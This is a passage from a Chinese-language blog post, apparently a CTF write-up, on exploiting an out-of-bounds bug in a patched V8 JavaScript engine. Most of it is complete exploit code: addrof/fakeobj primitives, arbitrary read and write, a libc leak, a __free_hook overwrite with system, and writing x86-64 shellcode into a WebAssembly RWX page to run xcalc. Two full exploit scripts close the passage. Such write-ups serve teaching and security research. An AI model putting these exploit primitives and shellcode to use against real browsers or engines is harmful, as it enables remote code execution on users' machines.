<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">let test = [1.1,2.2,3.3,4.4];</span><br><span class="line">let code_addr = arbRead(addrof(test.constructor)+0x30);</span><br><span class="line">let elf_base = arbRead(code_addr+0x41)-0xad54e0;</span><br><span class="line">let fprintf_got = 0xd9a3a0+elf_base;</span><br><span class="line">let libcbase = arbRead(fprintf_got) - 0x64eb0;</span><br><span class="line">console.log(&quot;[*]libcbase ==&gt; &quot;+hex(libcbase));</span><br></pre></td></tr></table></figure>
<p>然后我们把free_hook盖成system（盖成onegadget没有什么意义，不如system执行一些命令），再随便释放一个带有指令的堆块，使用console.log就能做到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">let systemaddr = libcbase + 0x000000000004F550;</span><br><span class="line">let freehook = libcbase + 0x3ed8e8;</span><br><span class="line">arbWrite(freehook,systemaddr);</span><br><span class="line">//%SystemBreak();</span><br><span class="line">console.log(&#x27;xcalc&#x27;);</span><br></pre></td></tr></table></figure>
<img src="/2022/06/15/v8-oob/result1.PNG" class="">

<p>这个方法虽然简单，但它有几个问题<br>1、弹完计算器之后它还会free别的很多堆块，你不能保证free的时候freehook不会导致什么问题，而且控制台会一直弹字符，比较难看。<br>2、在现实情况下，v8是开了沙箱的，我们达到命令执行之后通常还得做逃逸，如果是直接盖free_hook会导致后面逃逸的部分不好搞</p>
<p>基于这两个问题，一般情况下我们选择第二种方法来利用</p>
<h3 id="写入shellcode"><a href="#写入shellcode" class="headerlink" title="写入shellcode"></a>写入shellcode</h3><p>如果能执行shellcode，那我们可以做的事情就比只用system多一点。<br>写入shellcode的思路大体上就是开一块RWX的区域，然后往里写shellcode执行。这里我们使用webasm的方法来执行。老版本好像还有直接改JIT优化的代码区这种操作，但现在不行，本题中也不涉及JIT。</p>
<p>v8提供WebAssembly这种对象让我们能写wasm来产生一个函数。但是这个对象在生成底层代码的时候是会检查的，会阻止你传入那些系统函数，于是就需要我们在它生成完底层代码之后往它开的RWX页里写我们自己的shellcode，注意这里的shellcode要用wasm写。<br>利用代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);</span><br><span class="line">let wasm_mod = new WebAssembly.Module(wasm_code);</span><br><span class="line">let wasm_instance = new WebAssembly.Instance(wasm_mod);</span><br><span class="line">let f = wasm_instance.exports.main;</span><br><span class="line"> </span><br><span class="line">let rwx_page_addr = arbRead(addrof(wasm_instance)-1+0x88);</span><br><span class="line"> </span><br><span class="line">console.log(&quot;[+]RWX Wasm page addr: &quot; + hex(rwx_page_addr));</span><br><span class="line"> </span><br><span class="line">function copy_shellcode(addr, shellcode) </span><br><span class="line">&#123;</span><br><span class="line">    let buf = new ArrayBuffer(0x100);</span><br><span class="line">    let dataview = new DataView(buf);</span><br><span class="line">    let buf_addr = addrof(buf);</span><br><span class="line">    let backing_store_addr = buf_addr + 0x20;</span><br><span class="line">    backstoreWrite(backing_store_addr, addr);</span><br><span class="line"> </span><br><span class="line">    for (let i = 0; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">    dataview.setUint32(4*i, shellcode[i], true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">let shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];</span><br><span class="line"> </span><br><span class="line">console.log(&quot;[+]Copying shellcode to RWX page&quot;);</span><br><span class="line"> </span><br><span class="line">copy_shellcode(rwx_page_addr, shellcode);</span><br><span class="line"> </span><br><span class="line">console.log(&quot;[+]Popping calculator&quot;);</span><br><span class="line"> </span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
<img src="/2022/06/15/v8-oob/result2.PNG" class="">
<p>如果你不想用wasm，这里还可以用rop的方法，具体操作这里就不多说了，大体思路就是用environ变量获取一个栈上的地址，然后把ROP开RWX的链写到栈上，再在栈上的一片区域（因为你不能确定它返回地址是哪个)布置retn，用栈喷的方法来控制程序运行。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><h3 id="修改free-hook版"><a href="#修改free-hook版" class="headerlink" title="修改free_hook版"></a>修改free_hook版</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">function hex(i)</span><br><span class="line">&#123;</span><br><span class="line">    return &#x27;0x&#x27;+i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">&#125;</span><br><span class="line">const MAX_ITERATIONS = 10000;</span><br><span class="line">class Memory&#123;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        this.buf = new ArrayBuffer(8);</span><br><span class="line">        this.f64 = new Float64Array(this.buf);</span><br><span class="line">        this.u32 = new Uint32Array(this.buf);</span><br><span class="line">        this.bytes = new Uint8Array(this.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    f2i(val)&#123;</span><br><span class="line">        this.f64[0] = val;</span><br><span class="line">        let tmp = Array.from(this.u32);</span><br><span class="line">        return tmp[1] * 0x100000000 + tmp[0];</span><br><span class="line">    &#125;</span><br><span class="line">    i2f(val)&#123;</span><br><span class="line">        let tmp = [];</span><br><span class="line">        tmp[0] = parseInt(val % 0x100000000);</span><br><span class="line">        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);</span><br><span class="line">        this.u32.set(tmp);</span><br><span class="line">        return this.f64[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var mem = new Memory();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">let float_array = [1.1,2.2,3.3,4.4];</span><br><span class="line">let obj = &#123;&#x27;a&#x27;:1.1&#125;;</span><br><span class="line">let obj_array = [obj];</span><br><span class="line">let float_map = float_array.oob()</span><br><span class="line">let obj_map = obj_array.oob();</span><br><span class="line">let maxSize = 1028 * 8;</span><br><span class="line">function addrof(obj)</span><br><span class="line">&#123;</span><br><span class="line">  obj_array[0] = obj;</span><br><span class="line">  obj_array.oob(float_map);</span><br><span class="line">  let addr = mem.f2i(obj_array[0])</span><br><span class="line">  obj_array.oob(obj_map);</span><br><span class="line">  return addr;</span><br><span class="line">&#125;</span><br><span class="line">function fakeobj(addr)</span><br><span class="line">&#123;</span><br><span class="line">  float_array[0] = mem.i2f(addr);</span><br><span class="line">  float_array.oob(obj_map);</span><br><span class="line">  let fake = float_array[0];</span><br><span class="line">  float_array.oob(float_map);</span><br><span class="line">  return fake;</span><br><span class="line">&#125;</span><br><span class="line">let arb_Buffer = [float_map,1.1,2.2,3.3];</span><br><span class="line">function arbRead(addr)</span><br><span class="line">&#123;</span><br><span class="line">  if (addr % 2 == 0) </span><br><span class="line">  &#123;</span><br><span class="line">    addr += 1;</span><br><span class="line">  &#125;</span><br><span class="line">  let OBJ = fakeobj(addrof(arb_Buffer)-0x20);</span><br><span class="line">  arb_Buffer[2] = mem.i2f(addr - 0x10);</span><br><span class="line">  let result = mem.f2i(OBJ[0]);</span><br><span class="line">  console.log(&quot;[*]value at &quot;+hex(addr)+&quot; is &quot;+hex(result));</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line">function backstoreWrite(addr,value)</span><br><span class="line">&#123;</span><br><span class="line">  let OBJ = fakeobj(addrof(arb_Buffer)-0x20);</span><br><span class="line">  arb_Buffer[2] = mem.i2f(addr - 0x10);</span><br><span class="line">  OBJ[0] = mem.i2f(value);</span><br><span class="line">&#125;</span><br><span class="line">function arbWrite(addr,value)</span><br><span class="line">&#123;</span><br><span class="line">  let buf = new ArrayBuffer(8);</span><br><span class="line">  let view = new DataView(buf);</span><br><span class="line">  let backingsotre = addrof(buf)+0x20;</span><br><span class="line">  backstoreWrite(backingsotre,addr);</span><br><span class="line">  view.setBigInt64(0,BigInt(value),true);</span><br><span class="line">&#125;</span><br><span class="line">let test = [1.1,2.2,3.3,4.4];</span><br><span class="line">let code_addr = arbRead(addrof(test.constructor)+0x30);</span><br><span class="line">let elf_base = arbRead(code_addr+0x41)-0xad54e0;</span><br><span class="line">let fprintf_got = 0xd9a3a0+elf_base;</span><br><span class="line">let libcbase = arbRead(fprintf_got) - 0x64eb0;</span><br><span class="line">console.log(&quot;[*]libcbase ==&gt; &quot;+hex(libcbase));</span><br><span class="line">let systemaddr = libcbase + 0x000000000004F550;</span><br><span class="line">let freehook = libcbase + 0x3ed8e8;</span><br><span class="line">arbWrite(freehook,systemaddr);</span><br><span class="line">console.log(&#x27;xcalc&#x27;);</span><br></pre></td></tr></table></figure>
<h3 id="shellcode版"><a href="#shellcode版" class="headerlink" title="shellcode版"></a>shellcode版</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">function hex(i)</span><br><span class="line">&#123;</span><br><span class="line">    return &#x27;0x&#x27;+i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">&#125;</span><br><span class="line">const MAX_ITERATIONS = 10000;</span><br><span class="line">class Memory&#123;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        this.buf = new ArrayBuffer(8);</span><br><span class="line">        this.f64 = new Float64Array(this.buf);</span><br><span class="line">        this.u32 = new Uint32Array(this.buf);</span><br><span class="line">        this.bytes = new Uint8Array(this.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    f2i(val)&#123;</span><br><span class="line">        this.f64[0] = val;</span><br><span class="line">        let tmp = Array.from(this.u32);</span><br><span class="line">        return tmp[1] * 0x100000000 + tmp[0];</span><br><span class="line">    &#125;</span><br><span class="line">    i2f(val)&#123;</span><br><span class="line">        let tmp = [];</span><br><span class="line">        tmp[0] = parseInt(val % 0x100000000);</span><br><span class="line">        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);</span><br><span class="line">        this.u32.set(tmp);</span><br><span class="line">        return this.f64[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">let mem = new Memory();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">let float_array = [1.1,2.2,3.3,4.4];</span><br><span class="line">let obj = &#123;&#x27;a&#x27;:1.1&#125;;</span><br><span class="line">let obj_array = [obj];</span><br><span class="line">let float_map = float_array.oob()</span><br><span class="line">let obj_map = obj_array.oob();</span><br><span class="line">let maxSize = 1028 * 8;</span><br><span class="line">function addrof(obj)</span><br><span class="line">&#123;</span><br><span class="line">  obj_array[0] = obj;</span><br><span class="line">  obj_array.oob(float_map);</span><br><span class="line">  let addr = mem.f2i(obj_array[0])</span><br><span class="line">  obj_array.oob(obj_map);</span><br><span class="line">  return addr;</span><br><span class="line">&#125;</span><br><span class="line">function fakeobj(addr)</span><br><span class="line">&#123;</span><br><span class="line">  float_array[0] = mem.i2f(addr);</span><br><span class="line">  float_array.oob(obj_map);</span><br><span class="line">  let fake = float_array[0];</span><br><span class="line">  float_array.oob(float_map);</span><br><span class="line">  return fake;</span><br><span class="line">&#125;</span><br><span class="line">let arb_Buffer = [float_map,1.1,2.2,3.3];</span><br><span class="line">function arbRead(addr)</span><br><span class="line">&#123;</span><br><span class="line">  if (addr % 2 == 0) </span><br><span class="line">  &#123;</span><br><span class="line">    addr += 1;</span><br><span class="line">  &#125;</span><br><span class="line">  let OBJ = fakeobj(addrof(arb_Buffer)-0x20);</span><br><span class="line">  arb_Buffer[2] = mem.i2f(addr - 0x10);</span><br><span class="line">  let result = mem.f2i(OBJ[0]);</span><br><span class="line">  console.log(&quot;[*]value at &quot;+hex(addr)+&quot; is &quot;+hex(result));</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line">function backstoreWrite(addr,value)</span><br><span class="line">&#123;</span><br><span class="line">  let OBJ = fakeobj(addrof(arb_Buffer)-0x20);</span><br><span class="line">  arb_Buffer[2] = mem.i2f(addr - 0x10);</span><br><span class="line">  OBJ[0] = mem.i2f(value);</span><br><span class="line">&#125;</span><br><span class="line">function arbWrite(addr,value)</span><br><span class="line">&#123;</span><br><span class="line">  let buf = new ArrayBuffer(8);</span><br><span class="line">  let view = new DataView(buf);</span><br><span class="line">  let backingsotre = addrof(buf)+0x20;</span><br><span class="line">  backstoreWrite(backingsotre,addr);</span><br><span class="line">  view.setBigInt64(0,BigInt(value),true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);</span><br><span class="line">let wasm_mod = new WebAssembly.Module(wasm_code);</span><br><span class="line">let wasm_instance = new WebAssembly.Instance(wasm_mod);</span><br><span class="line">let f = wasm_instance.exports.main;</span><br><span class="line"> </span><br><span class="line">let rwx_page_addr = arbRead(addrof(wasm_instance)-1+0x88);</span><br><span class="line"> </span><br><span class="line">console.log(&quot;[+]RWX Wasm page addr: &quot; + hex(rwx_page_addr));</span><br><span class="line"> </span><br><span class="line">function copy_shellcode(addr, shellcode) </span><br><span class="line">&#123;</span><br><span class="line">    let buf = new ArrayBuffer(0x100);</span><br><span class="line">    let dataview = new DataView(buf);</span><br><span class="line">    let buf_addr = addrof(buf);</span><br><span class="line">    let backing_store_addr = buf_addr + 0x20;</span><br><span class="line">    backstoreWrite(backing_store_addr, addr);</span><br><span class="line"> </span><br><span class="line">    for (let i = 0; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">    dataview.setUint32(4*i, shellcode[i], true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">let shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];</span><br><span class="line"> </span><br><span class="line">console.log(&quot;[+]Copying shellcode to RWX page&quot;);</span><br><span class="line"> </span><br><span class="line">copy_shellcode(rwx_page_addr, shellcode);</span><br><span class="line"> </span><br><span class="line">console.log(&quot;[+]Popping calculator&quot;);</span><br><span class="line"> </span><br><span class="line">f();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://mouyeqi.github.io/2022/06/15/v8-oob/">https://mouyeqi.github.io/2022/06/15/v8-oob/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://mouyeqi.github.io">张三的博客</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/v8/">v8</a><a class="post-meta__tags" href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/">浏览器</a></div><nav id="pagination"></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2022 By John Doe</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>